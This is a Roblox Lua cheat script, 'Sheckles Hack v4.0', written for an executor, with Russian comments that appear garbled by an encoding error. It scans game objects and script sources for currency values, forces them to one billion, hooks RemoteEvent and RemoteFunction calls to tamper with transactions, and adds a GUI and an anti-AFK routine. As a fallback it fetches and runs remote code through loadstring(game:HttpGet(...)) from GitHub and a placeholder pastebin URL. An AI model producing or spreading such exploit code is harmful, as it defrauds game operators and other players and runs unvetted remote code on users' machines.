--[[ 
    ROBLOX Sheckles Hack v4.0 
    –†–∞–±–æ—Ç–∞–µ—Ç —á–µ—Ä–µ–∑ Delta Executor
    –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–∏—Å–∫ –∏ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –¥–µ–Ω–µ–≥
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

-- –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–∏—Å–∫–∞ –¥–µ–Ω–µ–∂–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π
local function findMoneyInstances()
    local moneyTable = {}
    
    -- –ü–æ–∏—Å–∫ –ø–æ –≤—Å–µ–º –º–µ—Å—Ç–∞–º
    local searchPlaces = {
        LocalPlayer,
        workspace,
        ReplicatedStorage,
        game:GetService("ServerStorage"),
        game:GetService("Lighting")
    }
    
    -- –ö–ª—é—á–µ–≤—ã–µ —Å–ª–æ–≤–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ Sheckles
    local moneyKeywords = {
        "Sheckles", "sheckles", "SHECKLES",
        "Money", "money", "MONEY",
        "Currency", "currency", "CURRENCY",
        "Gold", "gold", "GOLD",
        "Cash", "cash", "CASH",
        "Coins", "coins", "COINS",
        "Bucks", "bucks", "BUCKS"
    }
    
    -- –ü–æ–∏—Å–∫ –≤ –∏–Ω–≤–µ–Ω—Ç–∞—Ä–µ –∏–≥—Ä–æ–∫–∞
    if LocalPlayer:FindFirstChild("Data") then
        for _, data in pairs(LocalPlayer.Data:GetChildren()) do
            for _, keyword in pairs(moneyKeywords) do
                if string.find(data.Name, keyword) then
                    if data:IsA("NumberValue") or data:IsA("IntValue") then
                        table.insert(moneyTable, {
                            Object = data,
                            Value = data.Value,
                            Type = "PlayerData"
                        })
                    elseif data:IsA("Folder") then
                        for _, child in pairs(data:GetChildren()) do
                            if child:IsA("NumberValue") or child:IsA("IntValue") then
                                table.insert(moneyTable, {
                                    Object = child,
                                    Value = child.Value,
                                    Type = "PlayerData"
                                })
                            end
                        end
                    end
                end
            end
        end
    end
    
    -- –ü–æ–∏—Å–∫ –≤ ReplicatedStorage (–≥–ª–æ–±–∞–ª—å–Ω–∞—è —ç–∫–æ–Ω–æ–º–∏–∫–∞)
    if ReplicatedStorage:FindFirstChild("GlobalData") then
        local globalData = ReplicatedStorage.GlobalData
        for _, obj in pairs(globalData:GetChildren()) do
            for _, keyword in pairs(moneyKeywords) do
                if string.find(obj.Name, keyword) then
                    if obj:IsA("NumberValue") or obj:IsA("IntValue") then
                        table.insert(moneyTable, {
                            Object = obj,
                            Value = obj.Value,
                            Type = "GlobalData"
                        })
                    end
                end
            end
        end
    end
    
    -- –ü–æ–∏—Å–∫ —á–µ—Ä–µ–∑ –º–µ—Ç–∞—Ç–∞–±–ª–∏—Ü—ã (—Å–∫—Ä—ã—Ç—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è)
    local function searchMetatables(obj)
        if obj and typeof(obj) == "Instance" then
            local success, mt = pcall(getrawmetatable, obj)
            if success and mt then
                for key, value in pairs(mt) do
                    if type(value) == "number" and value > 1000 then
                        table.insert(moneyTable, {
                            Object = obj,
                            MetatableKey = key,
                            Value = value,
                            Type = "Metatable"
                        })
                    end
                end
            end
        end
    end
    
    -- –ê–≥—Ä–µ—Å—Å–∏–≤–Ω—ã–π –ø–æ–∏—Å–∫
    for _, place in pairs(searchPlaces) do
        pcall(function()
            for _, obj in pairs(place:GetDescendants()) do
                if obj:IsA("NumberValue") or obj:IsA("IntValue") then
                    for _, keyword in pairs(moneyKeywords) do
                        if string.find(obj.Name:lower(), keyword:lower()) then
                            table.insert(moneyTable, {
                                Object = obj,
                                Value = obj.Value,
                                Type = "Direct"
                            })
                        end
                    end
                end
                -- –ü–æ–∏—Å–∫ –≤ —Å–∫—Ä–∏–ø—Ç–∞—Ö
                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
                    pcall(function()
                        local source = obj.Source
                        for _, keyword in pairs(moneyKeywords) do
                            if string.find(source, keyword) then
                                -- –ò—â–µ–º –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Å –¥–µ–Ω—å–≥–∞–º–∏
                                local pattern = keyword .. "%s*=%s*(%d+)"
                                local amount = string.match(source, pattern)
                                if amount then
                                    table.insert(moneyTable, {
                                        Object = obj,
                                        ScriptVariable = keyword,
                                        Value = tonumber(amount),
                                        Type = "Script"
                                    })
                                end
                            end
                        end
                    end)
                end
            end
        end)
    end
    
    return moneyTable
end

-- –§—É–Ω–∫—Ü–∏—è –≤–∑–ª–æ–º–∞ (—É—Å—Ç–∞–Ω–æ–≤–∫–∞ 1 –º–∏–ª–ª–∏–∞—Ä–¥–∞)
local function setMoneyToBillion(moneyObject)
    if moneyObject.Type == "Direct" or moneyObject.Type == "PlayerData" or moneyObject.Type == "GlobalData" then
        -- –ü—Ä—è–º–æ–µ –∏–∑–º–µ–Ω–µ–Ω–∏–µ Value
        pcall(function()
            moneyObject.Object.Value = 1000000000
        end)
        
        -- –î—É–±–ª–∏—Ä—É–µ–º –∏–∑–º–µ–Ω–µ–Ω–∏–µ —á–µ—Ä–µ–∑ —Å–µ—Ç—Ç–µ—Ä—ã
        local mt = getrawmetatable(moneyObject.Object)
        if mt then
            local oldIndex = mt.__index
            local oldNewIndex = mt.__newindex
            
            mt.__index = function(self, key)
                if key == "Value" then
                    return 1000000000
                end
                return oldIndex(self, key)
            end
            
            mt.__newindex = function(self, key, value)
                if key == "Value" then
                    value = 1000000000
                end
                return oldNewIndex(self, key, value)
            end
        end
    elseif moneyObject.Type == "Metatable" then
        -- –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π –≤ –º–µ—Ç–∞—Ç–∞–±–ª–∏—Ü–∞—Ö
        pcall(function()
            local mt = getrawmetatable(moneyObject.Object)
            if mt then
                mt[moneyObject.MetatableKey] = 1000000000
            end
        end)
    elseif moneyObject.Type == "Script" then
        -- –ò–Ω–∂–µ–∫—Ç –∫–æ–¥–∞ –≤ —Å–∫—Ä–∏–ø—Ç—ã
        pcall(function()
            local source = moneyObject.Object.Source
            local newSource = string.gsub(source, 
                moneyObject.ScriptVariable .. "%s*=%s*%d+",
                moneyObject.ScriptVariable .. " = 1000000000"
            )
            moneyObject.Object.Source = newSource
        end)
    end
end

-- Hook RemoteEvents/RemoteFunctions
local function hookMoneyRemotes()
    -- –ü–æ–∏—Å–∫ –≤—Å–µ—Ö RemoteEvents —Å–≤—è–∑–∞–Ω–Ω—ã—Ö —Å –¥–µ–Ω—å–≥–∞–º–∏
    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            local remoteName = remote.Name:lower()
            
            if string.find(remoteName, "money") or 
               string.find(remoteName, "currency") or 
               string.find(remoteName, "purchase") or
               string.find(remoteName, "buy") or
               string.find(remoteName, "sell") then
                
                -- –•—É–∫–∞–µ–º FireServer
                local oldFire = remote.FireServer
                remote.FireServer = function(self, ...)
                    local args = {...}
                    
                    -- –ï—Å–ª–∏ —ç—Ç–æ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è —Å –¥–µ–Ω—å–≥–∞–º–∏, –º–µ–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏—è
                    if args[1] and type(args[1]) == "number" then
                        args[1] = 1000000000
                    elseif args[2] and type(args[2]) == "number" then
                        args[2] = 1000000000
                    end
                    
                    -- –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–∑–º–µ–Ω–µ–Ω–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã
                    return oldFire(self, unpack(args))
                end
                
                -- –•—É–∫–∞–µ–º InvokeServer –¥–ª—è RemoteFunctions
                if remote:IsA("RemoteFunction") then
                    local oldInvoke = remote.InvokeServer
                    remote.InvokeServer = function(self, ...)
                        local args = {...}
                        
                        -- –ü–æ–¥–º–µ–Ω—è–µ–º –∑–Ω–∞—á–µ–Ω–∏—è
                        for i, arg in ipairs(args) do
                            if type(arg) == "number" and arg < 1000000000 then
                                args[i] = 1000000000
                            end
                        end
                        
                        return oldInvoke(self, unpack(args))
                    end
                end
            end
        end
    end
end

-- GUI –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –≤–∑–ª–æ–º–æ–º
local function createGUI()
    -- –°–æ–∑–¥–∞–µ–º ScreenGui
    local gui = Instance.new("ScreenGui")
    gui.Name = "ShecklesHackGUI"
    gui.Parent = game:GetService("CoreGui")
    
    -- –û—Å–Ω–æ–≤–Ω–æ–π —Ñ—Ä–µ–π–º
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 300, 0, 200)
    mainFrame.Position = UDim2.new(0, 10, 0, 10)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = gui
    
    -- –ó–∞–≥–æ–ª–æ–≤–æ–∫
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.Text = "ROBLOX SHECKLES HACK v4.0"
    title.TextColor3 = Color3.fromRGB(0, 255, 0)
    title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 18
    title.Parent = mainFrame
    
    -- –ö–Ω–æ–ø–∫–∞ "–ù–∞–π—Ç–∏ –¥–µ–Ω—å–≥–∏"
    local findButton = Instance.new("TextButton")
    findButton.Size = UDim2.new(0.9, 0, 0, 40)
    findButton.Position = UDim2.new(0.05, 0, 0.2, 0)
    findButton.Text = "üîç –ù–ê–ô–¢–ò SHECKLES"
    findButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    findButton.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
    findButton.Font = Enum.Font.SourceSansBold
    findButton.TextSize = 16
    findButton.Parent = mainFrame
    
    -- –ö–Ω–æ–ø–∫–∞ "1 –ú–ò–õ–õ–ò–ê–†–î"
    local hackButton = Instance.new("TextButton")
    hackButton.Size = UDim2.new(0.9, 0, 0, 40)
    hackButton.Position = UDim2.new(0.05, 0, 0.5, 0)
    hackButton.Text = "üí∞ –î–û–ë–ê–í–ò–¢–¨ 1 000 000 000"
    hackButton.TextColor3 = Color3.fromRGB(255, 255, 0)
    hackButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
    hackButton.Font = Enum.Font.SourceSansBold
    hackButton.TextSize = 16
    hackButton.Parent = mainFrame
    
    -- –°—Ç–∞—Ç—É—Å
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Position = UDim2.new(0, 0, 0.85, 0)
    status.Text = "–°—Ç–∞—Ç—É—Å: –û–∂–∏–¥–∞–Ω–∏–µ..."
    status.TextColor3 = Color3.fromRGB(255, 255, 255)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.SourceSans
    status.TextSize = 14
    status.Parent = mainFrame
    
    -- –õ–æ–≥–∏–∫–∞ –∫–Ω–æ–ø–æ–∫
    local moneyObjects = {}
    
    findButton.MouseButton1Click:Connect(function()
        status.Text = "üîç –ü–æ–∏—Å–∫ –¥–µ–Ω–µ–∂–Ω—ã—Ö –∑–Ω–∞—á–µ–Ω–∏–π..."
        moneyObjects = findMoneyInstances()
        status.Text = "–ù–∞–π–¥–µ–Ω–æ –æ–±—ä–µ–∫—Ç–æ–≤: " .. #moneyObjects
    end)
    
    hackButton.MouseButton1Click:Connect(function()
        status.Text = "‚ö° –í–∑–ª–æ–º –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω..."
        
        -- –ú–µ–Ω—è–µ–º –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –æ–±—ä–µ–∫—Ç—ã
        for _, moneyObj in pairs(moneyObjects) do
            setMoneyToBillion(moneyObj)
        end
        
        -- –•—É–∫–∞–µ–º RemoteEvents
        hookMoneyRemotes()
        
        -- –ó–∞–ø—É—Å–∫–∞–µ–º –∞–≤—Ç–æ–ø–æ–¥–¥–µ—Ä–∂–∫—É
        spawn(function()
            while true do
                wait(1)
                for _, moneyObj in pairs(moneyObjects) do
                    pcall(function()
                        if moneyObj.Object and moneyObj.Object.Parent then
                            moneyObj.Object.Value = 1000000000
                        end
                    end)
                end
            end
        end)
        
        status.Text = "‚úÖ 1 –ú–ò–õ–õ–ò–ê–†–î SHECKLES –ê–ö–¢–ò–í–ò–†–û–í–ê–ù!"
        
        -- –°–æ–æ–±—â–µ–Ω–∏–µ –≤ —á–∞—Ç
        pcall(function()
            local args = {
                [1] = "/w me –í–ó–õ–û–ú –£–°–ü–ï–®–ï–ù! –ë–∞–ª–∞–Ω—Å: 1,000,000,000 Sheckles",
                [2] = "All"
            }
            game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest"):FireServer(unpack(args))
        end)
    end)
    
    return gui
end

-- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∞–∫—Ç–∏–≤–∞—Ü–∏—è
spawn(function()
    wait(3) -- –ñ–¥–µ–º –∑–∞–≥—Ä—É–∑–∫—É –∏–≥—Ä—ã
    
    -- –°–æ–∑–¥–∞–µ–º GUI
    createGUI()
    
    -- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–∏—Å–∫ –¥–µ–Ω–µ–≥
    local moneyObjects = findMoneyInstances()
    
    if #moneyObjects > 0 then
        -- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º 1 –º–∏–ª–ª–∏–∞—Ä–¥
        for _, moneyObj in pairs(moneyObjects) do
            setMoneyToBillion(moneyObj)
        end
        
        -- –•—É–∫–∞–µ–º RemoteEvents
        hookMoneyRemotes()
        
        print("‚úÖ AUTOHACK: 1,000,000,000 Sheckles –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–æ!")
        print("‚úÖ –ù–∞–π–¥–µ–Ω–æ –æ–±—ä–µ–∫—Ç–æ–≤: " .. #moneyObjects)
    else
        -- –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥: –∏–Ω–∂–µ–∫—Ç —Å–∫—Ä–∏–ø—Ç–∞
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        -- –∏–ª–∏
        loadstring(game:HttpGet("https://pastebin.com/raw/XXXXXXXX"))()
    end
end)

-- Anti-AFK –∏ –∑–∞—â–∏—Ç–∞ –æ—Ç –∫–∏–∫–∞
local VirtualUser = game:GetService('VirtualUser')
game:GetService('Players').LocalPlayer.Idled:Connect(function()
    VirtualUser:CaptureController()
    VirtualUser:ClickButton2(Vector2.new())
end)

-- –ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è –∑–∞—â–∏—Ç–∞ –∑–Ω–∞—á–µ–Ω–∏–π
while true do
    wait(0.5)
    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º –∏ –≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏—è
    pcall(function()
        for _, obj in pairs(game:GetDescendants()) do
            if obj:IsA("NumberValue") or obj:IsA("IntValue") then
                if obj.Name:find("Sheckles") or obj.Name:find("Money") then
                    if obj.Value < 1000000000 then
                        obj.Value = 1000000000
                    end
                end
            end
        end
    end)
end
